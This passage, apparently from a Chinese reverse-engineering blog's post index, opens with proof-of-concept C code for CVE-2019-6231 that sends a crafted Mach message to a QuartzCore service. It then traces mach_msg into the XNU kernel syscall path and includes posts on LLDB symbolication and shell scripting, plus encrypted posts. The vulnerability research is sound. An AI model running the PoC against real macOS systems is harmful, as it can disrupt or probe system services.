sizeof(quartz_register_client_t), msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { return -1 ; } mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c); uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30); printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\\n&quot;,context_port,conn_id); char *crash_log = &quot;crash.data&quot;; //size is 736. FILE *fp = fopen(crash_log, &quot;rb&quot;); if(fp == NULL){ printf(&quot;fopen error!\\n&quot;); } uint64_t fsize = get_filesize(crash_log); void *msg_buf = malloc(fsize); memset(msg_buf, 0, fsize); fread(msg_buf, fsize, 1, fp); quartzcore_mach_msg_t qc_mach_msg = {0}; qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX; qc_mach_msg.header.msgh_remote_port = context_port; qc_mach_msg.header.msgh_id = 40002; memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body)); *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1; // Ports count memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc); *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id; kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { printf(&quot;[-] Send message failed: 0x%d\\n&quot;, kr); return -1 ; } return 0; } 里面的macho函数mach_msg()到底后面执行到哪里？于是展开一段追踪 从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1 frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msg libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 Target 0: (CVE-2019-6231-poc) stopped. 调试可以看出mach_msg实现在libsystem_kernel.dylib之中 (lldb) dis libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 0x7fff7929969c &lt;+8&gt;: pushq %r13 0x7fff7929969e &lt;+10&gt;: pushq %r12 0x7fff792996a0 &lt;+12&gt;: pushq %rbx 0x7fff792996a1 &lt;+13&gt;: subq $0x28, %rsp 0x7fff792996a5 &lt;+17&gt;: movl %ecx, %r13d 0x7fff792996a8 &lt;+20&gt;: movl %esi, %ebx 0x7fff792996aa &lt;+22&gt;: movq %rdi, %r14 0x7fff792996ad &lt;+25&gt;: movl 0x10(%rbp), %eax 0x7fff792996b0 &lt;+28&gt;: movl %ebx, %r12d 0x7fff792996b3 &lt;+31&gt;: andl $0xfffffbbf, %r12d ; imm = 0xFFFFFBBF 0x7fff792996ba &lt;+38&gt;: movl %eax, (%rsp) 0x7fff792996bd &lt;+41&gt;: movl %r12d, %esi 0x7fff792996c0 &lt;+44&gt;: movl %edx, %r15d 0x7fff792996c3 &lt;+47&gt;: movl %r8d, -0x2c(%rbp) 0x7fff792996c7 &lt;+51&gt;: movl %r9d, -0x30(%rbp) 0x7fff792996cb &lt;+55&gt;: callq 0x7fff79299170 ; mach_msg_trap ... mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify) { mach_msg_return_t result; // eax mach_msg_option_t v8; // er12 result = mach_msg_trap(); if ( !result ) return 0; if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 ) { do result = mach_msg_trap(); while ( result == 268435463 ); } v8 = option; if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 ) { do result = mach_msg_trap(); while ( result == 268451845 ); } return result; } 通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_trap libsystem_kernel.dylib`mach_msg_trap: -&gt; 0x7fff79299170 &lt;+0&gt;: movq %rcx, %r10 0x7fff79299173 &lt;+3&gt;: movl $0x100001f, %eax ; imm = 0x100001F 0x7fff79299178 &lt;+8&gt;: syscall 0x7fff7929917a &lt;+10&gt;: retq Target 0: (CVE-2019-6231-poc) stopped. 这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。 XNU内核系统调用流程系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过intel官方文档可以找到 SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR 也就是内核需要将系统调用处理函数入口放到IA32_LSTAR model specific register. 在内核源码中对应在osfmk/i386/mp_desc.c的cpu_syscall_init(cpu_data_t *cdp)函数之中 /* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */ void cpu_syscall_init(cpu_data_t *cdp) { #if MONOTONIC mt_cpu_up(cdp); #else /* MONOTONIC */ #pragma unused(cdp) #endif /* !MONOTONIC */ wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS); wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter)); wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku); /* Enable syscall/sysret */ wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE); /* * MSRs for 64-bit syscall/sysret * Note USER_CS because sysret uses this + 16 when returning to * 64-bit code. */ wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall)); wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32)); /* * Emulate eflags cleared by sysenter but note that * we also clear the trace trap to avoid the complications * of single-stepping into a syscall. The nested task bit * is also cleared to avoid a spurious &quot;task switch&quot; * should we choose to return via an IRET. */ wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT); } wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));也就是系统调用会由hi64_syscall函数处理。这个函数实现在xnu/osfmk/x86_64/idt64.s之中 Entry(hi64_syscall) Entry(idt64_syscall) swapgs /* Use RAX as a temporary by shifting its contents into R11[32:63] * The systemcall number is defined to be a 32-bit quantity, as is * RFLAGS. */ shlq $32, %rax or %rax, %r11 .globl EXT(dblsyscall_patch_point) EXT(dblsyscall_patch_point): // movabsq $0x12345678ABCDEFFFULL, %rax /* Generate offset to the double-mapped per-CPU data shadow * into RAX */ leaq EXT(idt64_hndl_table0)(%rip), %rax mov 16(%rax), %rax mov %rsp, %gs:CPU_UBER_TMP(%rax) /* save user stack */ mov %gs:CPU_ESTACK(%rax), %rsp /* switch stack to per-cpu estack */ sub $(ISF64_SIZE), %rsp /* * Synthesize an ISF frame on the exception stack */ movl $(USER_DS), ISF64_SS(%rsp) mov %rcx, ISF64_RIP(%rsp) /* rip */ mov %gs:CPU_UBER_TMP(%rax), %rcx mov %rcx, ISF64_RSP(%rsp) /* user stack --changed */ mov %r11, %rax shrq $32, %rax /* Restore RAX */ mov %r11d, %r11d /* Clear r11[32:63] */ mov %r11, ISF64_RFLAGS(%rsp) /* rflags */ movl $(SYSCALL_CS), ISF64_CS(%rsp) /* cs - a pseudo-segment */ mov %rax, ISF64_ERR(%rsp) /* err/rax - syscall code */ movq $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp) movq $(T_SYSCALL), ISF64_TRAPNO(%rsp) /* trapno */ swapgs jmp L_dispatch /* this can only be 64-bit */ 继续跟下去，会得到如下执行流程 syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt; L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall /* * 64bit Tasks * System call entries via syscall only: * * r15 x86_saved_state64_t * rsp kernel stack * * both rsp and r15 are 16-byte aligned * interrupts disabled * direction flag cleared */ Entry(hndl_syscall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movl $-1, TH_IOTIER_OVERRIDE(%rcx) /* Reset IO tier override to -1 before handling syscall */ movq TH_TASK(%rcx),%rbx /* point to current task */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) /* * We can be here either for a mach, unix machdep or diag syscall, * as indicated by the syscall class: */ movl R64_RAX(%r15), %eax /* syscall number/class */ movl %eax, %edx andl $(SYSCALL_CLASS_MASK), %edx /* syscall class */ cmpl $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mach_scall64) cmpl $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_unix_scall64) cmpl $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mdep_scall64) cmpl $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_diag_scall64) /* Syscall class unknown */ sti CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1) /* no return */ hndl_syscall这个函数会系统调用分为hndl_unix_scall64 、hndl_mach_scall64、hndl_mdep_scall64、hndl_diag_scall64四类分别处理 这里以hndl_unix_scall64为列 Entry(hndl_unix_scall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movq TH_TASK(%rcx),%rbx /* point to current task */ incl TH_SYSCALLS_UNIX(%rcx) /* increment call count */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) sti CCALL1(unix_syscall, %r15) /* * always returns through thread_exception_return */ 这里调动了unix_syscall函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查 以及根据系统调用表去调用对应的实现 thread = current_thread(); uthread = get_bsdthread_info(thread); // regs is derrived from r15 ... code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK; callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code]; // ... vt = (void *)uthread-&gt;uu_arg; // ... memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi, args_in_regs * sizeof(syscall_arg_t)); // ... error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); 目前执行的流程如下 hi64_syscall L_dispatch_U64 L_dispatch_64bit L_common_dispatch hndl_syscall // rdx, pushed in hi64_syscall hndl_unix_scall64 unix_syscall64 error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there 参考https://www.binss.me/blog/interrupt-and-exception/ https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html https://gist.github.com/yrp604/23e86dce9ca12bf514ef","tags":[{"name":"XNU","slug":"XNU","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"},{"name":"Kernel","slug":"Kernel","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"}]},{"title":"LLDB调试器栈符号化","date":"2018-10-03T05:27:59.000Z","path":"2018/10/03/xia0LLDB/xia0LLDB/","text":"强化你的lldb调试器Why?lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。 How?但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。 正好lldb提供了python的接口，可以开发自定义的命令。 And what ?虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在这里 这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下： update现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入sbt -f block-json-file-path即可加载该文件。效果如下： 原始的bt命令结果 sbt命令（没有加载block符号文件） sbt命令（带有block符号文件）","tags":[{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"},{"name":"LLDB","slug":"LLDB","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"}]},{"title":"unicorn","date":"2018-09-13T06:39:03.000Z","path":"2018/09/13/unicorn/unicorn/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"}]},{"title":"reversing-dot-kr","date":"2018-04-29T03:47:09.000Z","path":"2018/04/29/reversing-dot-kr/reversing-dot-kr/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"}]},{"title":"shellscript总结","date":"2018-04-17T10:33:40.000Z","path":"2018/04/17/shellscript/shellscript/","text":"shellscript总结变量name=&quot;zhang&quot; 变量名和等号之间不能有空格 英文，数字下划线，不能有空格，标点 不能以数字开头 不能是关键字 单引号/双引号 单引号会原样输出 双引号里面可以有变量，转义字符 字符串# 拼接 name=&#39;zhang&#39; helloname=&quot;hello, &quot;$name&quot;!&quot; helloname=&quot;hello, &quot;${name}&quot;!&quot; #获取长度 echo ${#name} # [out]:5 #提取子字符串 echo ${name:1:4} #[out]:hang 数组 my_array=(A B C D) echo &quot;数组的元素为: ${my_array[1]}&quot; echo &quot;数组的元素为: ${my_array[@]}&quot; #[out]: #数组的元素为: B #数组的元素为: A B C D 文件#文件存在且为目录 -d #文件存在且为一般文件 -f #文件存在且为链接文件 -L ifa=10 b=20 if [ $a == $b ];then echo &quot;a 等于 b&quot; elif [ $a -gt $b ];then echo &quot;a 大于 b&quot; elif [ $a -lt $b ];then echo &quot;a 小于 b&quot; else echo &quot;没有符合的条件&quot; fi # [out]:a 等于 b for# for in for loop in 1 2 3 4 5;do echo &quot;The value is: $loop&quot; done # [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5 xfindfunction xfind(){ find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0 grep -i $2 } if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot; else xfind $1 $2 fi xargs管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数 更多细节点这里 function函数返回值只能输0-255数字，且用$?接收 function test(){ read num return $num } test if [ $? -eq 1 ];then echo &quot;yes&quot; else echo &quot;no&quot; fi crontabhttp://wangchujiang.com/linux-command/c/crontab.html 默认日志路径:/var/mail/Username 修改邮件接收地址：MAILTO=939xxxx983@qq.com 日志重定向：* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1","tags":[{"name":"shell","slug":"shell","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"}]},{"title":"正则表达式","date":"2018-04-08T08:32:33.000Z","path":"2018/04/08/正则表达式/正则表达式/","text":"Need password to decrypt! Incorrect Password! No content to display! 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